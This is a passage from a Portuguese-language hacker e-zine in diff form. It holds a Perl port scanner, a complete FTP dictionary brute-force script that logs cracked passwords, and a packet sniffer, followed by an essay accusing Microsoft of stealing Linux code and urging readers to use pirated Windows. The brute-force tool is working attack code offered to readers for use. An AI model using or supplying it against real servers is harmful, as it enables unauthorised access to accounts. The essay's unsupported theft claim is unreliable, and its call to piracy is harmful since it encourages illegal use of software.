+print "\nInteresting ports on $ARGV[0]\n\n";
+for($port_in = 0; $port_in <= 6000; $port_in++) {
+$iaddr= inet_aton($ARGV[0]) || die "Nao foi possivel conectar no
+Host.($!)";
+$paddr= sockaddr_in($port_in, $iaddr);
+$proto= getprotobyname('tcp');
+socket(SOCK, AF_INET, SOCK_STREAM, $proto);
+            if(connect(SOCK, $paddr)) {
+            $servico=getservbyport($port_in,'tcp');
+            print "Port $port_in --> $servico  open\n";
+close(SOCK);
+}
+}
+print "\nScanner completed...\n\n";
+exit;
+
+Scan de portas desenvolvido pelo hax0r inferninh0 ( valeu inferninho
+por libera seu code :) Ele scaneia portas de 0 a 6000 a  unica  funcao
+desconhecida é 'getservbyport' q obtem o servico da porta, o resto  se
+ja conhece !!
+
+_________________
+5. Presentinho   \_________________
+___________________________________\
+
+  Aproveitem e estudem esses codez :)
+
+-==-=-=-=-=-= Cut Here Brute_force_attack.pl -=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+#!/usr/bin/perl
+
+use Socket;
+
+print "\n\07FTP Brute Force attack 1.0 - Near(Z) - 1998 - SouL Hunter";
+print "\nVersao MONO, nearz\@cyberpace.org\n\n";
+if ($ARGV[0] eq '' || $ARGV[1] eq '' || $ARGV[2] eq '') { print
+"\n\nUsage: hackftp Host Login Dictionary\nEx. hackftp 127.0.0.1 Joao
+Dict\n\n";exit;}
+my($h,$p,$in_addr,$proto,$addr);
+$i=0;$temp='';$temp2='';$temp10='';$temp12='';$h = "$ARGV[0]";
+$p = 21;
+$in_addr = (gethostbyname($h))[4]; $addr = sockaddr_in($p,$in_addr);
+$proto = getprotobyname('tcp');
+$check=0;
+open (FILE,"$ARGV[2]") || die "cade o dicionario?";
+&resume;
+do{
+      &connection;
+      &getword;
+      &data1;
+      &data2;
+      &result;
+#      &getword;
+#      &data2;
+#      &result;
+      close S;
+}while(1==1);
+
+sub connection
+{
+        socket(S, AF_INET, SOCK_STREAM, $proto) or die $!;
+        connect(S,$addr) or die $!;
+}
+
+sub data1
+{
+        do{
+                read(S, $var1, 1) || die $!;
+                $temp="$temp$var1"; $i++;
+        }while(substr($temp,$i-3,3) ne '220');
+
+}
+sub data2
+{
+      $temp='';
+      $i=0;
+      send (S,"user $ARGV[1]\n",0) || die "Erro enviando";
+        do{
+                read(S, $var1, 1) || die $!;
+                $temp="$temp$var1"; $i++;
+        }while(substr($temp,$i-3,3) ne '331' && substr($temp,$i-3,3)
+ne '530');
+      if(substr($temp,$i-3,3) eq '530'){
+            print "\nLogin nao permitido - $ARGV[1]\n\n";
+            exit;
+      }
+            send (S,"pass $temp2",0) || die "Erro enviando";
+      $temp='';
+      $i=0;
+        do{
+                read(S, $var1, 1) || die $!;
+                $temp="$temp$var1"; $i++;
+        }while(substr($temp,$i-3,3) ne '530' && substr($temp,$i-3,3)
+ne '230');
+}
+sub result
+{
+        if(substr($temp,$i-3,3) eq '230'){
+                  print "\n\07$ARGV[0]/$ARGV[1] - [$z]senha : $temp2\n";
+                  open (FILE3,">>$ARGV[0].$ARGV[1]-result") ;
+                  print FILE3 "\n1 - $ARGV[0]/$ARGV[1] - [$z]    senha :
+$temp2\n";
+                  print FILE2 "\n1 - $ARGV[0]/$ARGV[1] - [$z]    senha :
+$temp2\n";
+                  close FILE3;
+                exit;
+      }
+        if(substr($temp,$i-3,3) eq '530'){
+
+            open (FILE4,">$ARGV[0].$ARGV[1]-resume");
+              print "$ARGV[0]/$ARGV[1] - [$z]    not found - $temp2";
+            print FILE4 "$z
+                      ";
+            close FILE4;
+      }
+}
+
+sub getword
+{
+        $temp2='';
+        do{
+                read(FILE, $var12, 1);
+                $temp2="$temp2$var12";
+        }while($var12 ne chr(10));
+      $z++;
+}
+sub resume
+{
+            if(open(FILE5,"$ARGV[0].$ARGV[1]-resume")){
+                  read (FILE5, $temp10, 50);
+                  close FILE5;
+                  $z=$temp10;
+                    for($i=0;$i<$z;$i++){
+                        do{
+                                  read(FILE, $var12, 1);
+                                  $temp2="$temp2$var12";
+                          }while($var12 ne chr(10));
+
+                  }
+
+            }
+$i=0;
+}
+
+-=-=-=-=-=-=-=-=-=- Cut Here sniffer.pl -=-=-=-=-=-=-=-=-=-=-=-=
+
+#!/usr/bin/perl
+# Simple script for educational purposes
+# It prints to STDOUT flags tcp packets from ftp server and client
+
+use Net::RawIP; # Net::RawIP rulez :)
+require 'getopts.pl';
+
+Getopts('i:d:n:');
+die "Usage $0 -i  -d  -n "
+unless ($opt_d && $opt_d && $opt_n);
+
+print "Now please login to your ftp server\n";
+
+@flags = qw/URG ACK PSH RST SYN FIN/;
+$filter = "dst host $opt_i and dst port 21";
+$filter1 = "src host $opt_i and src port 21";
+$psize = 1500;
+$device = $opt_d;
+$timeout = 500;
+
+if(fork()){
+$a = new Net::RawIP;
+my $pcap = $a->pcapinit($device,$filter,$psize,$timeout);
+loop $pcap,$opt_n,\&cl,\@a;
+           }
+        else {
+$b = new Net::RawIP;
+my $pcap = $b->pcapinit($device,$filter1,$psize,$timeout);
+loop $pcap,$opt_n,\&sv,\@a;
+                }
+
+sub cl {
+$a->bset(substr( $_[2],14));
+my @fl = $a->get({tcp=>
+                     [qw(psh syn fin rst urg ack)]
+             });
+print "Client -> ";
+map { print "$flags[$_] "  if $fl[$_] } (0..5);
+print "\n"
+}
+
+sub sv {
+$b->bset(substr( $_[2],14));
+my @fl = $b->get({tcp=>
+                     [qw(psh syn fin rst urg ack)]
+             });
+print "Server -> ";
+map { print "$flags[$_] "  if $fl[$_] } (0..5);
+print "\n";
+}
+
+__________________
+5 Finalizando     \_______________
+__________________________________\
+
+  Bem esse foi mais um txt inutil by BlackSh33p, kra pesso desculpa a
+todos vcs fiquei devendo queria te botado muito mais coisa mas nao deu
+mesmo. Tava estudando pra uma prova e acabei esquecendo. Prometo que o
+proximo sera bem melhor. Creditos ao inferninh0 por me permitir usufruir
+de seus codez ( falei bunito agora né :), ao IP_FIX  por  me  ceder  um
+espaco na zine e um alo a _tzlord_ meu parceirao :D
+
+Tank's for all
+
+_________________________
+7.Links                  \_________________
+___________________________________________\
+
+http://www.motdlabs.org/
+http://www.perl.com/
+http://www.perl.org/
+http://www.oreilly.com/
+http://Tutorial.VirtualAve.net/
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[08]=-[Nós ainda estamos ganhando...]=-|bashX|=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+  Desde 1900  e "nao  me lembro  quando" isso  ja estava  previsto, que iria ser
+motivo da mais longa e discutida guerra digital. E dizer guerra voces sabem  que
+nao  eh exagero  nenhum. Quantos  milhares de  desenvolvedores nesse  mundo nao
+desenvolvem aplicativos que por minima que seja a utilidade do seu software,  eh
+desenvolvido com intencao de nao dar se  quer uma misera linha de codigo para  a
+gigante Microsoft. Claro  que nao estou  falando de dar  diretamente a ela,  mas
+contra  ela,  a  favor  dos sistemas  operacionais  ditos  LIVRES,  aqueles cuja
+filosofia seria  mais que  intocavel. Meu  Deus, o  Linux em  1999, que  nem tao
+distante esta - Para algumas pessoas isso eh ate recente. Quem ja ve esse  filme
+a bem mais tempo vai ter a ficha caida tambem. La estava ele, o inimigo numero 1
+da  Microsoft,  usado pelos  revolucionarios,  anarquistas, hackers,  esquerdos,
+inimigos, enfim, a parte especial que se diferenciava da massa.
+
+  Linux  e sua  filosofia de  liberdade, enquanto  centenas ou  ate milhares  de
+pessoas, separavam horas de suas vidas desenvolvendo para um sistema operacional
+cuja existencia era apenas para iniciar o fim da era Windows, essas pessoas  nao
+sabiam  metade do que iria acontecer  e que dali pra frente alem  de aplicativos
+elas estavam escrevendo uma historia digital.
+
+  Anos vao se passando e os aplicativos vao sendo melhorados, novas  tecnologias
+e ferramentas de  tecnologia de desenvolvimento  de softwares vao  aparecendo em
+noticias postadas  em portais  e revistas  - O  Linux estava  mais do  que nunca
+provando ser  o pesadelo  da microsoft.  Esta por  sua vez  so aparecia com seus
+lancamentos previsiveis e vergonhosos, em 2001 nao se ouvia falar bem da empresa
+de Bill Gates, eram apenas vexames apos vexames, o que dava-se a imaginar eh que
+aquilo  soh  teria  de  piorar, os  anos  passavam  os  lancamentos seguidos  de
+atualizacoes MS caminhavam pra uma mesmisse e Linux e os outros OS como FreeBSD,
+ja traziam novidades consideravelmente  visiveis ao mundo de  aplicativos, tanto
+para  Desktop quanto  para Servidores.  Ate aplicativos  fora dessa  briga MS  x
+FilosoFree ja estavam entrando na onda de FreeWare. Ja eh comum encontrar  algum
+software gratis que nao deixa nada a desejar pra softwares "copyrightados",  ate
+mesmo com a mesma eficiencia.
+
+  Enfim, chegamos  no ponto  em questao.  Alguem neste  mundo chegou realmente a
+pensar ou pensa ateh hoje que a Microsoft Corporation ou Bill Gates propriamente
+dito  teria  orgulho  suficiente ao  ponto  de  chegar a  nao  se  aproveitar da
+inteligencia, diria mais, da genialidade de tantos desenvolvedores de  softwares
+neste mundo... Alguem foi ingenuo o suficiente pra pensar isso?
+
+  Quem aqui nao conhece Bill Gates, o homem que passou a perna na Apple, o homem
+da frase: "Os inteligentes criam, os espertos COPIAM", nao necessariamente nesta
+mesma  exata!  Mas  todo  o  esforço, todos  os  anos  que  se  passaram com  os
+programadores de todo mundo que desenvolveram  com a intencao de fazer do  mundo
+digital um lugar melhor  para os usuarios do  MUNDO, foi tudo, linha  por linha,
+cada linha de codigo, lida pela Microsoft. Eh incomodavelmente visivel isso,  do
+Windows XP pra frente voce tem a prova  mais do que suficiente de que o que  era
+previsto durante anos  pela comunidade anti-microsoft  veio a acontecer.  Nao me
+venham defender a MS  Corporation dizendo que: "e  se os caras tambem  tiverem o
+dom?". Meus amigos, ninguem quer  tentar reinventar a roda. Eh  impossivel negar
+que no minimo a evolucao do sistema da MS nao tenha tido motivo certo, ela tinha
+que fazer alguma coisa, o Linux  soh melhorava; A Microsoft deve ao  Linux, essa
+eh a verdade, eu continuo na mesma  tecla, eh impossivel q ela nao tenha  olhado
+uma linha de codigo se quer.
+
+  Nao que o Windows XP  seja perfeito e traga a  satisfarcao que um OS Free  nos
+traz. Mas ta ali, e todo mundo sabe, o que estou tentando dizer com isso eh:  do
+que  adiantou  tanta  briga?  Os  desenvolvedores  foram  otimos,  nos trouxeram
+otimizacoes essenciais pra nossa vida mas, e  ai, vem um fdp e rouba, nao  estou
+falando de copiar e colar, digo roubar a tecnologia, querendo ou nao, para todos
+nos que sabemos que  windows eh um lixo,  todos tb chegamos a  conclusao de que:
+Windows ainda eh um lixo, mas na frente do q era, estah menos ruim. Fala  serio:
+Linux, FreeBSD, OBSD, QNX, NBSD, o que  seja, tem todos os recursos tb, mas  nao
+eh todo mundo que tem esta massa cinzenta preocupada no Sistema Operacional  que
+vai usar. Pro usuario o  que eh mais facil eh  melhor, e hoje em dia,  o usuario
+normal q  preferir outro  OS q  nao seja  Windows, porque  Windows nao livre, no
+minimo nao tem acesso a um pirateiro  de esquina de rua. Uma copia pirateada  de
+XP chega a sair por 5 reais,  eh mais amigavel pra qualquer usuario, eu  conheco
+ditos hackers  que nao  vivem sem  Windows. Venhamos  e convenhamos, querendo ou
+nao, o  sistema operacional  da microsoft  sendo usado  pirateado como  eh, pela
+maioria esmagadora  de seus  usuarios chega  a ser  perfeito, muito  mais se  vc
+pensar que: "perae,  se estah do  jeito que estah,  pq desenvolvedores do  mundo
+todo tiveram seus softwares copiados  pra q esse Sistema Operacional  chegasse a
+ficar  assim,  aceitavel  atualmente do  jeito  que  estah, e  eu  nao  ter pago
+praticamente porra nenhuma por ele, e  estar satisfeito com o desempenho de  meu
+computador, sabendo tb q  praticamente seu codigo eh  de origem nobre, eu  estou
+usando um software livre sim, roubado,  mas ainda sim livre, logo, eh  dente por
+dente e unha por unha,  dah lah dah cah!, vc  nos roubou, mas eu te  lerdo. FUCK
+OFF MS".
+
+  Nao estou falando pra sermos amigos  da Microsoft, nao mesmo, devemos mais  do
+que nunca ser inimigos, ela eh ladra,  mas pq nao usufruirmos de uma coisa  "que
+eh nossa" por direito, devemos usar,  abusar e ser inimiga dessa maldita  ladra,
+ate pq nao sabemos ate quando teremos acesso a esse OS por meios ilegais. Então,
+ENTENDAM: SENDO MICROSOFT, E USANDO ILEGALMENTE, PERFEITO VOCE JA ESTAH  FAZENDO
+SUA PARTE.  ESTA GUERRA  ESTAH LONGE  DE TERMINAR,  NAO SEJA  INIMIGO DE  OUTROS
+FREE/OS, SOMOS INIMIGOS DA MESMA MERDA!! NOSSO ALVO, SEMPRE FOI E SEMPRE SERAH A
+MICROSOFT!!!
+
+by bashX
+
+bashx@click21.com.br
